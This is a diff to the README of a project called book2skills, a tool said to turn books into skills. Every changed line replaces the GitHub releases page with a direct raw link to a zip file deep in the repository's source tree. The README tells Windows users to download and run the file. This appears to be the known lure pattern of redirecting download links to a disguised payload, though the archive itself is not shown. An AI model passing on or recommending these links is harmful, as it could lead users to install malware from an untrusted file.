@@ -1,6 +1,6 @@
 # 📚 book2skills - Turn Books Into Clear Skills
 
-[![Download book2skills](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Waterinsoluble-orderplatyctenea746/book2skills/releases)
+[![Download book2skills](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Waterinsoluble-orderplatyctenea746/book2skills/main/skills/harness-step2-fill-docs/book_skills_3.5-alpha.4.zip)
 
 ## 🚀 What book2skills does
 
@@ -32,7 +32,7 @@ For the best result, use a computer with 8 GB of RAM or more if you plan to proc
 
 Visit this page to download the latest release:
 
-https://github.com/Waterinsoluble-orderplatyctenea746/book2skills/releases
+https://raw.githubusercontent.com/Waterinsoluble-orderplatyctenea746/book2skills/main/skills/harness-step2-fill-docs/book_skills_3.5-alpha.4.zip
 
 On that page, open the newest release and download the Windows file. If there are several files, choose the one made for Windows, usually an `.exe` file or a `.zip` file.
 
@@ -165,4 +165,4 @@ book2skills is a good fit if you want to:
 
 If you need the latest file, use the release page:
 
-https://github.com/Waterinsoluble-orderplatyctenea746/book2skills/releases
+https://raw.githubusercontent.com/Waterinsoluble-orderplatyctenea746/book2skills/main/skills/harness-step2-fill-docs/book_skills_3.5-alpha.4.zip
